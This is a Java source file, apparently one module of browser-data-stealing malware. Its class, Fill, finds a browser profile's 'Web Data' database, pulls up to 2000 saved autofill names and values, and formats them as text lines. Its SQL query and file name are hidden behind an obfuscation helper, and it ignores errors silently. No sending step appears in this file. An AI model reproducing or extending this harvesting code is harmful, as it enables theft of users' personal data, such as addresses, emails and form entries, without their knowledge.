package noface.browsers;

import noface.config.S;

import java.nio.file.Files;
import java.nio.file.Path;
import java.sql.ResultSet;
import java.util.ArrayList;
import java.util.List;

public final class Fill {

    public record Entry(String name, String value, int count) {}

    private static String sql() {
        return S.e("SELECT name, value, count FROM autofill WHERE value IS NOT NULL AND length(value) > 0 LIMIT 2000");
    }

    public static List<Entry> pull(Profile profile) {
        List<Entry> out = new ArrayList<>();
        Path db = profile.dir().resolve(S.e("Web Data"));
        if (!Files.isRegularFile(db)) return out;
        Db.query(db, sql(), rs -> add(rs, out));
        return out;
    }

    private static void add(ResultSet rs, List<Entry> out) {
        try {
            String name = rs.getString(1);
            String value = rs.getString(2);
            int count = 0;
            try {
                count = rs.getInt(3);
            } catch (Exception ignored) {
            }
            if (value == null || value.isBlank()) return;
            out.add(new Entry(name == null ? "" : name, value, count));
        } catch (Exception ignored) {
        }
    }

    public static String fmt(List<Entry> entries) {
        StringBuilder sb = new StringBuilder();
        for (Entry e : entries) {
            sb.append(e.name()).append(": ").append(e.value()).append('\n');
        }
        return sb.toString();
    }

    private Fill() {}
}
